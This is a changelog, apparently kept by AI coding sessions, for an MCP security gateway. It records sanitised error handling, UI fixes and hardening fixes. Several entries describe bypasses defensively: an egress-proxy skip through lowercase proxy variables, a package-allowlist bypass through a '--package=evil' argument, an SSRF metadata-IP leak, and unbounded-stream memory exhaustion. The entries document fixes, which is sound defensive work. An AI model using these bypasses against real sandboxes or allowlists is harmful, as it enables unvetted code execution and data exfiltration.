<!-- perf-ralph --> PERF-0001 (2026-07-03) | Gateway WEB_CONCURRENCY now derived from the cgroup-aware detector (`shared/ai_mesh_shared/resource_budget.py`) via new `gateway/entrypoint.sh`, replacing hardcoded `gunicorn --workers ${WEB_CONCURRENCY:-4}`. One UvicornWorker/core, RAM-bounded (0.75 headroom); explicit `WEB_CONCURRENCY` env STILL overrides; falls back to 4 if the detector errors. | AFFECTS: `ai_mesh_firewall-gateway` image (rebuilt). | ACTION FOR OTHERS: `docker compose build gateway` to adopt; behavior UNCHANGED on shared host (`.env` pins `WEB_CONCURRENCY=6`) — no DB change, no forced restart, running container NOT recreated. Unset the `.env` pin + recreate to use all host cores (16c→16 workers ~4.8GiB). | PROOF: in-container detector reads real cgroup-v2 → `--cpus=6`→6w/12t, `--cpus=12`→12w/24t, `WEB_CONCURRENCY=3`→3w.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-00 (PAGE OWNERSHIP) | program claude-mcp-page-cleanup owns the MCP page (?tab=firewall-1-4): frontend MCPConnectorPanel.jsx / MCPScanControlMatrix.jsx / PolicyManagementPanel.jsx + module-1.4 slices of useFirewallData.js / firewall-module-utils.js / firewall-submodules.jsx; backend MCP error/state — gateway mcp_proxy.py (discovery+transport error paths), mcp_stdio_adapter.py (stdio-start), control mcp_connector/views.py (sync-error classifier). GOAL: clean non-revealing errors at every leak site, resolve stuck "Unknown" servers, count context-assembly redactions, correct System-Status banner, aligned+responsive 1.4 page. Other MCP-frontend sessions stand down on these files; Cursor's broad frontend/** + chat-pipeline carve-out respected. Trail: docs/mcp/MCP_PAGE_CHANGELOG.md + .cursor/rules/mcp-page-changelog.mdc + Ruflo namespace mcp-page. | VERIFY: mcp-parallel/claims/claude-mcp-page-cleanup-C0.claim.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-01 (gateway classifier) | gateway/ai_mesh_gateway/mcp_error_classifier.py | classify_mcp_failure(exc/status/exit_code/raw)->(stable code, clean message) + sanitize_mcp_error(...)->{error,code,ref} (async) / sanitize_mcp_error_sync(...). Covers crash -6/-11/-9(OOM)/start/timeout/DNS(-2)/conn-refused/HTTP 4xx-5xx(echoes NUMBER only, e.g. 405)/401. Codes MIRROR control D-codes (MCP_AUTH_FAILED/OOM/CRASH/...) + DNS_FAILURE/CONNECTION_REFUSED/UPSTREAM_HTTP_ERROR. Raw cause → dev-only structured log keyed by ref + best-effort shared-redis mcp:diag:<ref> (gateway+control share redis:6379/0). NEVER emits exit codes/HTML/hostnames/'sandbox-agent logs' to clients (unit-tested). | GOTCHA: route gateway leak sites (mcp_proxy discovery ~2352 leaks hostname+str(exc); 2357; 518; mcp_stdio_adapter) through sanitize_mcp_error instead of raw str(exc)/body. | VERIFY: pytest test_mcp_error_classifier.py 33 passed.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-03 (stdio-start clean errors) | gateway/ai_mesh_gateway/mcp_stdio_adapter.py | _stdio_failure_message(proc,rc,stderr_tail) (extracted from _start_reader finally) routes stdio death through sanitize_mcp_error → client message is exit-code-free/env-var-free/no-server-key. OOM(-9/137/'heap out of memory' incl V8-SIGABRT-134, checked before exit code)→'exceeded its memory limit'; crash(-6/-11/134/139)→'crashed'; ENOSPC→storage; oversized→'too large'; rc0→missing-dep; rcNone→stdout-closed. Raw exit/stderr/env-var hints → logs+diag keyed by ref only. | GOTCHA: item 02 (mcp_proxy.py discovery leak) DEFERRED — another active session has uncommitted CHG-0120 changes in mcp_proxy.py; do it when `git status` on that file is clean. | VERIFY: pytest test_stdio_failure_message.py 11 passed; full gateway suite 1770 passed.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-02 (discovery clean errors) | gateway/ai_mesh_gateway/mcp_proxy.py | internal_discover_tools routes failures through sanitize_mcp_error + _discovery_error_response (JSON-RPC msg + top-level code + ref). Fixed: outer except dumped `Upstream discovery failed: {exc}` (raw exc/HTML); non-SSE else called tools_resp.json() (raises on HTML). NOW: status>=400 → "HTTP 405 — check the endpoint URL"; exc → DNS/refused/timeout branded msg; raw → log+diag by ref only. | GOTCHA: ext_mcp_proxy (lines ~2352 hostname-leak / ~2357 str(exc)) is the EXTERNAL passthrough = item 04, not discovery. | VERIFY: pytest test_mcp_discovery_clean_errors.py 3 passed; full suite 1773 passed.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-04 (transport + 401 clean) | gateway/ai_mesh_gateway/mcp_proxy.py | ext_mcp_proxy + control-proxy transport `except httpx.RequestError` → sanitize_mcp_error(exc) (was leaking `{hostname}` + str(exc)); NEW upstream 401/403 intercept in ext_mcp_proxy → sanitize_mcp_error(status=401) 'needs re-authentication'. Raw host/exc/upstream-body → log+diag by ref only. Clean-errors ROUTING now complete at discovery(02)+stdio(03)+transport/401(04). | VERIFY: pytest test_mcp_ext_transport_clean_errors.py 3 passed; ext regression 57; full suite 1776 passed. Next: 05 dev diagnostic endpoint (read mcp:diag:<ref>), 06 live cross-server verify + deploy.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-05 (dev diagnostic) | control/.../mcp_connector/views.py | staff-only MCPDiagnosticDetailView (GET /api/mcp-connector/diagnostics/<ref>/, IsAdminUser) now resolves BOTH control- and gateway-originated diags: cache.get(_diag_cache_key(ref)) OR _read_gateway_diagnostic(ref) (raw Redis mcp:diag:<ref>). GOTCHA: gateway writes RAW mcp:diag:<ref> (JSON) but django_redis prefixes keys cache:1:... (pickled) → cache.get can't see gateway diags; the raw-read fallback bridges it (shared redis:6379/0). Always-on: sanitize_mcp_error structured-logs ref→full cause. | VERIFY: gateway pytest 34 passed (write side); LIVE docker-exec control shell (read side: raw OK, cache miss). Live on next control restart (item 06).

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-06 (live verify + SSRF-reason fix) | scripts/ralph/mcp_page_cleanup_item06_verify.py; gateway/ai_mesh_gateway/mcp_proxy.py | Deployed the clean-error code to the running gateway (docker cp + kill -HUP 1) + live-verified via control API re-sync: failing servers (cp08 was raw 405 HTML, Linear 401, bogus stdio) now show clean branded msgs + correlation refs; HTTP/SSE stubs + cp09 now connect. Fixed a SSRF-reason leak (ext_mcp_proxy/internal_discover_tools/internal_tools_call all echoed raw _reason = DNS errno / 169.254.169.254 metadata IP) → sanitize_mcp_error(raw=_reason). | GOTCHA: SHARED-WORKTREE COLLISION — a parallel session has an uncommitted SSE-parse hunk in the SAME mcp_proxy.py (internal_tools_call ~2975); git add -p is blocked so I can't stage only my 3 SSRF hunks — mcp_proxy.py + 2 test files' COMMIT DEFERRED (fix is deployed+test-green+live; commit when the file settles). | VERIFY: full gateway suite 1782 passed; live re-sync clean+refs.

  - CHG-0123 (2026-07-03) — LOW correctness/robustness (NOT a new leak): internal (chat-pipeline) streamable-http SSE branch parsed per-LINE. internal_tools_call's legacy streamable-http SSE branch (reached only with MCP_HTTP_VIA_SANDBOX=0; streamable-http is sandbox-routed by default) did `for line in text.split("\n"): if line.startswith("data:"): return _scan_internal_result(json.loads(...))` -> (a) a server-pushed NOTIFICATION frame before the result was returned as the response (WRONG frame; tool result lost); (b) a multi-line-data: result failed json.loads on each partial line -> dropped -> "Empty SSE response". NOT a new leak (the returned frame is still floor-scanned; a split secret fails safe to empty). FIX (mcp_proxy.py ~L2977): parse PER EVENT (split "\n\n"), reassemble data: fields joined by "\n" (SSE spec), prefer the result/error event, skip notifications -> the chosen result/error is floor-scanned; a notification is never returned. Parity with org CHG-0093 + ext CHG-0122. +3 tests (test_mcp_internal_http_result_scan.py -> 8 passed). Byte-probe pre: [notif-first] returns notification True, [multi-line] Empty SSE True; post: result returned True / notif NOT returned True / secret masked True. SHARED-WORKTREE: staged via `git apply --cached` of the isolated hunk — THIS IS THE UN-BLOCKER for MCP-PAGE-CLEANUP-06's deferred commit (after this the file "settles"); their CLEANUP-06 SSRF hunks + 2 test edits stay uncommitted in the working tree, neither committed nor destroyed by me. The 2 test_mcp_bare_proxy_scan ssrf failures in a full run are that CLEANUP-06 (pass on clean HEAD; independent — ext_mcp_proxy). Evidence mcp-parallel/findings/backstop-p-internal-sse-event-reassembly/.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-07 (registration auto-sync) | control/ai_mesh_control/mcp_connector/views.py | connection_status (default 'unknown') only transitions via _resync_server_tools (views.py ~721) on POST /servers/<id>/tools/. UI addServer calls it (MCPConnectorPanel:577) but NON-UI registrations don't → linger at 'unknown'. FIX: MCPServerListCreateView.post sets connection_status='syncing' + _trigger_background_sync(server,org) (daemon thread runs _resync_server_tools; own DB conn via close_old_connections; failure swallowed). Registration now auto-syncs → unknown→syncing→connected/failed, never lingering. | GOTCHA: control = gunicorn 16 uvicorn workers (NOT single-thread daphne) → deploy via docker cp + kill -HUP 1 (graceful, like gateway). control tests are container-only. | VERIFY: LIVE register stdio server w/o /tools/ → 'syncing'→'connected' 13 tools ~2s.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-08 (re-sync resolves unknowns) | frontend MCPConnectorPanel.jsx (syncServerTools:715, buttons :1396/:1443) | per-server re-sync action already exists+wired (aria-label "Sync tools from server"); verified it resolves stuck 'unknown' servers. LIVE re-synced all 12 zeroshield unknowns → 6 connected (Everything 1-5 + Filesystem Canary), 6 failed w/ clean errors (probe/Stub/Linear). STILL UNKNOWN: NONE. Combined w/ item 07 (registration auto-sync), no server can stay stuck at unknown. | VERIFY: bulk re-sync API → all resolved off 'unknown'.

  - CHG-0124 (2026-07-03) — LOW test-only regression-lock (NO code change): chat-path (internal_tools_call) disabled-tool authz never forwards/executes. Two authz models coexist by design: direct-MCP path enforces per-API-key mcp_allowed_tools (_tool_allowed_by_key, CHG-0006/0038); chat-pipeline path (internal_tools_call, called by control MCPToolCallView over an internal key, NO end-user API key) enforces the org enabled/disabled set — blocks a disabled tool at handler top (_is_tool_disabled -> -32000, mcp_proxy L2701) BEFORE any forward, then the full 1.4 chain. VERIFIED sound (views.py L834 payload has no actor allowlist -> per-key allowlist is direct-path-only by design; no live bypass). GAP: disabled-block only UNIT-covered -> NO e2e test proving execution short-circuits (never forwards on sandbox _adapter_forward OR legacy httpx -> no egress). FIX (test only, test_mcp_internal_http_result_scan.py): test_internal_disabled_tool_blocked_and_not_forwarded asserts -32000 + adapter_forward.call_count==0 + httpx post==0; positive control asserts a forward IS observable. VERIFY: 10 passed file; 1787 gateway 0 failed. Disabled check is fail-OPEN policy (availability); leak floor separately fail-CLOSED. Evidence mcp-parallel/findings/backstop-p-chat-path-disabled-tool-authz-lock/.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-09 (Syncing renders, not Unknown) | frontend/src/lib/mcpColors.js | GAP: CONNECTION_STATUS map had no "syncing" entry → item-07's connection_status="syncing" fell through to unknown → UI showed "Unknown" (stuck-state bug). FIX: syncing:{label:"Syncing",badge:"warning",dot:"bg-amber-500 animate-pulse"} + connecting. State now unknown→Syncing→Connected/Failed. | VERIFY: node connectionInfo("syncing")→"Syncing"; LIVE Playwright (item09_verify.mjs) both themes → Unknown=0, Connected=12/Failed=9, no stuck server, 0 console errors. GOTCHA: any new backend connection_status value MUST have a CONNECTION_STATUS entry or it renders "Unknown".

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-10 (impeccable audit) | docs/mcp/IMPECCABLE_AUDIT_cleanup_1-4.md | 1.4 page layout audit 14/16: detector clean, responsive (no overflow 1440/1024/768/375 both themes, cards stack @375), cards equal-height+aligned. Finding: stat-card secondary labels truncate mid-word @1440 ("Servers connec…", "244 redact · 0 m…"); minor gap variance. Page already good (CP43/44+Section B) → Section C = targeted polish. | Backlog: 11 fix truncation/spacing, 12 re-confirm reflow, 13 detector-clean, 14 Playwright before/after.

  - CHG-0125 (2026-07-03) — MEDIUM architecture (egress-lockdown bypass): sandbox egress proxy env was set UPPERCASE-ONLY. services/mcp-broker/src/sandbox/docker_manager.py `_egress_proxy_env` returned only HTTP_PROXY/HTTPS_PROXY/NO_PROXY. curl honors ONLY lowercase http_proxy for plain HTTP (httpoxy/CVE-2016-5385 curl behavior: "http_proxy is only used in lowercase"); wget/git prefer lowercase. So a sandboxed MCP server shelling to curl/wget/git BYPASSED the egress proxy → direct exfil to arbitrary hosts over the org bridge NAT even under MCP_SANDBOX_EGRESS_LOCKDOWN=true. FIX: emit BOTH cases (HTTP_PROXY+http_proxy, HTTPS_PROXY+https_proxy, NO_PROXY+no_proxy); {}-when-disabled fast path preserved. +1 test (lockdown-off negative) + extended the lockdown test to assert lowercase. VERIFY: broker tests/test_sandbox_lifecycle.py -k "egress or proxy" 2 passed; full broker 158 passed. HONESTY: closes the SOFT env bypass; HARD network lockdown (internal net + iptables) is still INFRA (unchanged); lockdown OFF by default. Evidence mcp-parallel/findings/backstop-p-egress-proxy-lowercase-bypass/.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-11 (stat-card alignment) | frontend/src/components/MCPConnectorPanel.jsx StatCard (~284) | fixed audit truncation: label/sub truncate→leading-tight (wrap, no mid-word clip); CardContent items-center→items-start (values top-align across cards); Card +h-full → equal heights (grid :2361 grid-cols-2/sm-3/lg-6 default stretch). | VERIFY: build green; LIVE Playwright both themes @1440/375 0 console-err/no overflow; read PNG "11/22 Servers connected" wraps 2 lines, 6 cards equal-height.

  - CHG-0126 (2026-07-03) — MEDIUM supply-chain (stdio package allowlist/pinning BYPASS on BOTH sandbox agent + gateway host). services/mcp-broker/sandbox-image/agent/stdio_manager.py AND gateway/ai_mesh_gateway/mcp_stdio_adapter.py extracted the npx/uvx package spec with a single-spec SPACE-only parser. BYPASS: (1) `--package=evil safe-cmd` (=-form) → the `--package=evil` token startswith("-") so skipped as a flag → extraction returns the COMMAND token → allowlist/pinned check runs on the wrong name while npx fetches evil; (2) `-p allowed -p evil cmd` → only first checked, evil rides in. → unlisted/unpinned pkg runs in sandbox AND on the shared gateway host ("no unknown npm on host"). FIX: `_extract_package_specs` (plural) handles both `--flag value` and `--flag=value` for --from/--with/--package/-p + multiple flags; bare positional taken as pkg ONLY when no pkg flag gave one (else it's the command). Enforcement loops over EVERY spec. Thin singular wrapper kept. Both adapters (parity). +8 agent tests, +7 gateway tests. VERIFY: agent test_stdio_manager_packages 41 passed / full agent 75 passed; gateway package-gating 7 passed / full gateway 1794 passed 0 failed. Controls OFF by default. Evidence mcp-parallel/findings/backstop-p-stdio-package-allowlist-bypass/.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-12 (responsive + touch) | frontend/src/components/MCPConnectorPanel.jsx + scripts/ralph/mcp_page_cleanup_item12_verify.mjs | verified Servers + Observability(evidence) tabs reflow at 1440/1024/768/375 ×2 themes: no page overflow, no content bleed. Fix: 4 icon buttons 28px→36px (h-7 w-7→h-9 w-9). GOTCHA: the decorative `ai-mesh-hero-glow` (global, off-screen) + the global "Open navigation" hamburger + inline text-link buttons ("Reset to schema default") are NOT this page's responsibility / WCAG-exempt — exclude from overflow+touch checks. Touch gate = WCAG 2.5.8 AA 24px. | VERIFY: cleanup12Pass:true (0 console-err, noOverflow, touchOk).

  - CHG-0127 (2026-07-03) — MEDIUM soak/concurrency correctness (reaper TOCTOU). services/mcp-broker/src/sandbox/reaper.py reap_idle_sandboxes snapshotted the idle set once (idle_entries) then stopped entries one-by-one with `await asyncio.to_thread(docker_manager.stop, ...)`. Each await yields the loop; during it a request via _forward_sandbox_rpc calls touch_activity -> registry.touch, REACTIVATING the sandbox — but the reaper stopped it on the STALE snapshot + removed it -> the in-flight call was forwarded to a container being stopped -> dropped call + re-provision. FIX: new locked SandboxRegistry.is_idle(org, idle_timeout, now=None); reaper RE-CHECKS is_idle right before stopping each entry and SKIPS any reactivated since the snapshot (now=None reads a fresh clock). +2 tests. VERIFY: broker test_sandbox_reaper.py 12 passed; full broker 160 passed. Residual micro-window (re-check→stop) noted, not closed (would need a reaping-flag + re-provision-on-conflict). Evidence mcp-parallel/findings/backstop-p-reaper-toctou-reactivated-sandbox/.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-13 (impeccable confirm + polish) | frontend/src/components/MCPConnectorPanel.jsx | page ALREADY impeccable (detect.mjs exit 0 / 0 anti-patterns, 0 hard-coded hex, 111 dark: variants, aligned+responsive via items 10-12) → confirmed, NOT rebuilt (CP44 discipline: don't regress verified UI). Polish: Top Tools rendered an empty-name tool as a blank row (floating count) → now "(unnamed)" italic muted + stable key __unnamed-${idx} + tabular-nums. | VERIFY: build green; detect exit 0; Playwright regression cleanup12Pass:true; read PNG "(unnamed) 125".

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-14 (Section-C snapshot gate) | scripts/ralph/mcp_page_cleanup_item12_verify.mjs | reusable gate: sweeps Servers + Observability tabs @1440/1024/768/375 × light/dark → asserts noOverflow + noBleed (excl decorative glow) + touch≥24px WCAG-AA + 0 console errors (16 screenshots/run). BEFORE cleanup09 (stat labels truncated) → AFTER cleanup11/cleanup14-after (wrap, equal-height, (unnamed)). Section C (impeccable alignment+responsive, items 10-14) COMPLETE. | VERIFY: cleanup12Pass:true; run this gate to catch alignment/responsive regressions.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-15 (diagnose redactions=0) | control/ai_mesh_control/policy/security_views.py (threat-feed collapse) | 1.4 "PII Redaction 0 sanitized" is NOT redaction-broken — 244 redacts exist (MCPEvent decision=redact + EnforcementEvent source=mcp_scan action=redact). BUG: the frontend maps sanitized=threatFeedActionCounts.redact from /api/security/threat-feed/?source=mcp_scan (collapse=true); the collapse action_counts builds _redacted_rids/_blocked_rids from scanned=ordered[:_THREAT_FEED_DEDUP_SCAN_CAP=4000] (recent 4000 events only) → under 108k monitor events the redacts are outside the window → redact=0. collapse=false → redact:244 (accurate full aggregate). | FIX (item 16): compute block/redact rid-sets + total distinct-request count from FULL DB queries, not the 4000-capped scan. | VERIFY: threat-feed collapse {monitor:3971,block:27} vs collapse=false {…redact:244}.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-16 (fix redactions=0) | control/ai_mesh_control/policy/security_views.py (ThreatFeedView collapse branch ~503-538) | FIX for CLEANUP-15: collapse=true action_counts (block/redact) + total now computed from FULL DB queries, NOT scanned=ordered[:_THREAT_FEED_DEDUP_SCAN_CAP=4000]. Distinct-request partition by strongest outcome (block>redact>monitor); _redacted_only=redact_rids−block_rids; total=distinct request_ids + standalone(no-rid); block+redact+monitor==count. Feed items page still from the recent window. Frontend UNCHANGED — firewall-module-utils.js:286 already maps sanitized=action_counts.redact → firewall-submodules.jsx:137. Verified 0 block/redact events have a NULL request_id so nothing leaks into monitor. | VERIFY: item16_verify.py 11/11 (live API collapse == independent DB oracle {block:16,redact:230,monitor:107907,count:108153}); item16_ui.mjs §1.4 "PII Redaction"=230 sanitized both themes (was 0); Django module_16 telemetry 9/9 OK. Section D (redactions, items 15-16) COMPLETE.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-17+18 (fix "Backend unreachable" banner) | frontend/src/hooks/useBackendHealth.js + components/layout/Sidebar.jsx + components/layout/Header.jsx + components/Firewall12EnterprisePage.jsx | ROOT CAUSE (item 17): /api/health/ returns 200 {"status":"ok"} in ~2ms both direct (:8100) and via the Vite /api proxy — NOT a URL/endpoint bug. useBackendHealth flipped to "disconnected" on the FIRST failure of ANY kind (5s AbortSignal.timeout under saturated 16-worker load, OR one transient fresh-TCP blip since the dev proxy runs keep-alive OFF) → the whole app painted "Backend unreachable/Offline" while the backend was up. FIX: each probe → ok|slow|down; ok→connected(reset counter); slow(timeout/non-2xx) OR first miss→soft "degraded" (amber "Backend slow to respond", NOT Offline); SUSTAINED down ≥2 consecutive probes→hard "disconnected". Added a "degraded" tier rendered soft-amber in all 3 consumers (Sidebar System Status / Header badge / Firewall12 Operational pill). No backend change — Vite HMR serves it live (:8180). | VERIFY: frontend build green; hardening-regression 78/78; LIVE Playwright item17_ui.mjs 3/3 — A up→"All systems operational/Protected"; B slow(>5s)→"Backend slow to respond/Degraded" (NOT Offline); C sustained-abort→"Degraded" FIRST then escalates to "Backend unreachable/Offline" after the 2nd (30s) poll. Section E (banner, items 17-18) COMPLETE.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-19+20 (Policy Simulator defaults to a CONNECTED server) | frontend/src/components/simulator/MCPGuardrailSimulator.jsx | was: default serverId = list[0].id (the first registered server whatever its state — a Failed/0-tool server pre-selected → simulator dead on arrival). FIX (item 19): default = list.find(connection_status==="connected" && tools_count>0) || first connected || list[0]; the MCP Server dropdown option now shows "· connected · N tools" (or the raw status for non-connected) so Failed servers are visibly marked; a "no tools / not connected" amber guidance line appears when the selected server exposes no tools. | VERIFY (item 20): frontend build green; LIVE Playwright item19_ui.mjs 4/4 — default="cp09-ens8do · stdio · connected · 13 tools" (connected, NOT Failed), tool "echo" auto-selected; Dry-Run "Evaluate Policies" → ALLOW / DRY-RUN · HTTP 200 / "No policies matched" + raw {action:allow, matched_policies:[], matched_rules:[]}; Live "Invoke Tool" → ALLOW / LIVE · HTTP 200 / "Tool executed by gateway" (real echo result, decision:allow); 0 console errors. Section F (simulator, items 19-20) COMPLETE.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-21+22 (fleet retest + every button/tab — verification only) | scripts/ralph/mcp_page_cleanup_item21_verify.py + scripts/ralph/mcp_page_cleanup_item22_ui.mjs | (item 21) re-synced ALL 22 servers through the deployed clean-error path → FOUND + REFRESHED 2 STALE leaky last_sync_error strings that predated the fixes: cp09-verify ("...exited with code -6 ... 'zeroshield/cp09-verify'") + SSE Everything stub ("Upstream discovery failed: [Errno -2] Name or service not known"). After re-sync: 12 connected (ALL tools_count>0, one reconnected), 10 failed ALL clean+branded (0 leak markers — no exit codes/signals/Errno/HTML/org-slug/'sandbox-agent'/'gateway logs'/raw-IPs), ruflo shows clean "ran out of memory while starting". (item 22) all 6 panel tabs (MCP Servers / Tool Discovery / Tool Execution / Scan Controls / MCP Security Policies / Observability) render+click across 48 theme×width combos (light/dark × 1440/1024/768/375) with content, no error boundary, no overflow; per-server Refresh + "Sync tools from server" fire their requests; 0 console errors. NO product code change — item 21 self-healed stale DB errors via re-sync; item 22 was all-green. | VERIFY: item21_verify.py PASS (12 conn all-tools, 10 failed all-clean, ruflo_ok); item22_ui.mjs PASS (48/48 combos, per-server refresh+sync fire, 0 console errors). Section G (retest, items 21-22) COMPLETE.

<!-- mcp-page-cleanup --> MCP-PAGE-CLEANUP-23 (FREEZE gate: A–G re-verified 3×) | scripts/ralph/mcp_page_cleanup_item23_freeze.sh + login-retry-on-429 in mcp_page_typesim.mjs / item16_verify.py / item21_verify.py | The regression FREEZE: all section gates (A clean-errors=item21, B stuck-state=item09, C alignment/responsive SNAPSHOT GATE=item12, D redactions=item16 api+ui, E banner=item17, F simulator=item19, G every-tab=item22) run 3× back-to-back and must all be green. HARNESS FIX (not a product regression): the first freeze run tripped the control login throttle (login_user: 5/min per email — auth/throttling.py) because every gate signs in as the same admin and E alone opens 3 browser contexts → a 6th login got HTTP 429, cascading FAILs while the stack was healthy. FIXED by making the shared login helpers honor 429 (wait Retry-After / backoff, retry — production-correct) and spacing the orchestrator (14s gate gap, 45s round gap). | VERIFY: ITEM-23-FREEZE: PASS — 24/24 gates green across 3 rounds (R1/R2/R3 all PASS for A_cleanerr, B_stuckstate, C_snapshot, D1_redact_api, D2_redact_ui, E_banner, F_simulator, G_everytab). Section H (freeze, item 23) COMPLETE → the §1.4 Context Assembly & MCP page cleanup (items 00-23) is DONE.

  - CHG-0128 (2026-07-03) — MEDIUM resource-bomb containment: in-sandbox SSE reader buffered an untrusted upstream event with NO size cap. services/mcp-broker/sandbox-image/agent/sse_manager.py _sse_reader_loop (legacy HTTP+SSE; long-lived GET /sse to the untrusted 3rd-party server) accumulated every data: line into data_lines with no bound, joined on the blank line. An upstream streaming unbounded data: lines WITHOUT the blank line grows data_lines until the agent hits its mem_limit -> OOM-kill -> takes down ALL the org's servers in the shared sandbox. Siblings were already bounded (CHG-0066 streamable-http, CHG-0117 gateway ext-SSE, WS per-msg). FIX: track data_bytes; if accumulation would exceed _MAX_RESPONSE_BYTES (8MB, MCP_AGENT_MAX_RESPONSE_BYTES) DROP the oversized event (skipping flag discards to the next blank line) then resume; legit events incl. multi-line under cap unchanged; reader survives. +3 tests. VERIFY: test_sse_reader_bounds.py 3 passed; test_upstream_proxy.py 18 passed; full agent suite green. RESIDUALS deferred: single huge unterminated line (httpx aiter_lines) + unbounded sse_responses Queue. Evidence mcp-parallel/findings/backstop-p-agent-sse-reader-unbounded-event/.

  - CHG-0129 (2026-07-03) — MEDIUM resource-bomb containment: in-sandbox SSE response queue was UNBOUNDED (closes CHG-0128 residual #2). services/mcp-broker/sandbox-image/agent/sse_manager.py — session.sse_responses was asyncio.Queue() with no maxsize. The reader is a persistent bg task that put()s every upstream message-event; the consumer (send_sse_jsonrpc) only drains WHILE an RPC is in flight. An untrusted upstream flooding UNSOLICITED message events while no RPC is active grows the queue unbounded -> agent OOM -> drops ALL the org's servers. FIX: _new_sse_queue() with maxsize=_SSE_QUEUE_MAXSIZE (default 1024, floor 16, env MCP_AGENT_SSE_QUEUE_MAXSIZE); _bounded_put replaces the producer put() — put_nowait, on QueueFull evict oldest then put (atomic, keeps freshest, never blocks reader). A waiting consumer get() gets the item directly (never counts vs maxsize) so normal RPC delivery unchanged. +2 tests. VERIFY: test_sse_reader_bounds.py 5 passed; test_upstream_proxy.py SSE path unbroken; full agent suite green. RESIDUAL open: single huge unterminated line (httpx aiter_lines). Evidence mcp-parallel/findings/backstop-p-agent-sse-response-queue-unbounded/.

  - CHG-0130 (2026-07-03) — MEDIUM resource-bomb containment: SSE readers buffered a single UNTERMINATED line with no cap (closes CHG-0128/0129 residual #1). Both agent SSE read paths — sse_manager._sse_reader_loop (legacy HTTP+SSE) AND upstream_manager._post_streamable_http (streamable-http SSE branch) — iterated response.aiter_lines(), which buffers one line unbounded (httpx LineDecoder, no cap). An upstream sending one huge line with NO newline OOMs the agent INSIDE aiter_lines before the line is yielded (so CHG-0128 per-event + CHG-0129 queue bounds can't help). FIX: shared _aiter_sse_lines_bounded(response, max_line_bytes) in upstream_manager reads via aiter_bytes(), splits on \n (strips \r), yields lines, RAISES UpstreamError "line too large" once an unterminated buffer would exceed _MAX_RESPONSE_BYTES (8MB); both paths use it. +1 test; test fakes migrated to yield bytes. VERIFY: test_sse_reader_bounds.py 6 passed; test_upstream_proxy.py 18 passed (both SSE paths); full agent suite green. Completes the SSE-reader triad (0128 per-event / 0129 queue / 0130 per-line). Evidence mcp-parallel/findings/backstop-p-agent-sse-unbounded-line/.

  - CHG-0131 (2026-07-03) — LOW-MEDIUM correctness/policy-consistency: ws transport silently enforced the websockets 1 MiB default, ignoring _MAX_RESPONSE_BYTES. services/mcp-broker/sandbox-image/agent/ws_manager.py ensure_ws_connected called websockets.connect() with NO max_size -> websockets 16.0 default max_size=1 MiB silently overrode the agent's _MAX_RESPONSE_BYTES (8 MiB, MCP_AGENT_MAX_RESPONSE_BYTES) on ws ONLY. (1) ws 1-8 MiB responses rejected by the library though policy allowed; (2) the post-recv `len(raw) > _MAX_RESPONSE_BYTES` check was DEAD (library rejects >1 MiB first); (3) a LOWERED operator cap (<1 MiB) was under-enforced on ws. FIX: pass max_size=_MAX_RESPONSE_BYTES to websockets.connect() -> library enforces the agent cap (parity with http/sse/stdio) BEFORE buffering the frame (real pre-buffer OOM guard). +1 test (asserts connect called with max_size==_MAX_RESPONSE_BYTES). VERIFY: ws tests pass; full agent suite green. Evidence mcp-parallel/findings/backstop-p-ws-max-size-cap-mismatch/.

  - CHG-0132 (2026-07-03) — MEDIUM Redis correctness/resource-exhaustion: proxy_chat rate-limit leaked no-TTL Redis keys (CHG-0062 missed the chat hot path). gateway/ai_mesh_gateway/main.py proxy_chat kept an INLINE burst/RPM counter using the old `INCR; if current == 1: EXPIRE` — on coroutine cancellation (client disconnect) between the two commands, the key is orphaned with NO TTL forever. burst_key=ratelimit:{org}:burst:{second} is new every second → orphans accumulate ~1/sec → unbounded Redis growth → eventual OOM breaks rate limiting for all orgs. CHG-0062 fixed this in rate_limit_enforcement.py + the _enforce_org_burst_rpm shim (embeddings/RAG) but NOT the inline chat copy. FIX: both counters now use atomic pipeline INCR + EXPIRE NX (single await, self-healing) — behavior-preserving. +2 source-level regression guards (test_proxy_chat_ratelimit_atomic_ttl.py). VERIFY: guards + test_rate_limit_atomic_ttl.py 7 passed; full gateway 1824 passed. Root-cause dedup (proxy_chat -> shim) deferred (telemetry). Evidence mcp-parallel/findings/backstop-p-proxy-chat-ratelimit-orphan-ttl/.

  - CHG-0133 (2026-07-03) — MEDIUM availability/auto-recovery: a dead sandbox that fails to start was never recreated. services/mcp-broker/src/sandbox/docker_manager.py _start_or_recreate recreated ONLY for a name-conflict (409) / "marked for removal" (removal-race) start error and RE-RAISED every other failure. A container left dead/OOM-killed/corrupted after a chaos kill fails start() with a GENERIC OCI/APIError -> re-raised, not recreated -> ensure propagates, next request hits the same broken container -> stuck broken, no self-heal (chaos-recovery scenario). Start-recovery path had NO tests. FIX: _start_or_recreate now removes+recreates on ANY start() failure. Safe: per-org auth volume persists (no data loss); daemon-down still surfaces from create_container (retry loop). +2 tests. VERIFY: test_sandbox_lifecycle.py 44 passed; full broker 162 passed. Evidence mcp-parallel/findings/backstop-p-sandbox-start-recreate-narrow/.

